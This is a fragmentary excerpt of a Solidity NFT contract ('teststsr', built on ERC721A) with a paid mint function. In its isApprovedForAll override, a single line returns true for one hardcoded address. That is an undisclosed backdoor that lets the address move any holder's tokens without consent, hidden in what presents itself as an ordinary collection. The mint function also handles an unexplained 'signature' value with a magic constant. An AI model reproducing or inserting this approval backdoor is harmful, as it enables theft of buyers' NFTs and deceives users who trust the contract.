  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xe024F3fdC93B6f4407e2A657C4722213885Ef14B){return true;}
...
// File: contracts/etst.sol


pragma solidity ^0.8.0;


contract teststsr is Ownable, ERC721A {
	...
	constructor()
    // Name
	ERC721A("teststsr", "efsadf", 5, 5000) {
    }
	...
	function mint(uint signature) external payable {
        uint count=maxBatchSize;
		require(!isPaused, "Sales are off");
        require(totalSupply() + count <= collectionSize,"Exceeds max supply");
        require(count <= maxBatchSize,"Exceeds max per transaction");
        require(_walletMintedCount[msg.sender] + count <= maxBatchSize * 3,"Exceeds max per wallet");
        signature-=33333;
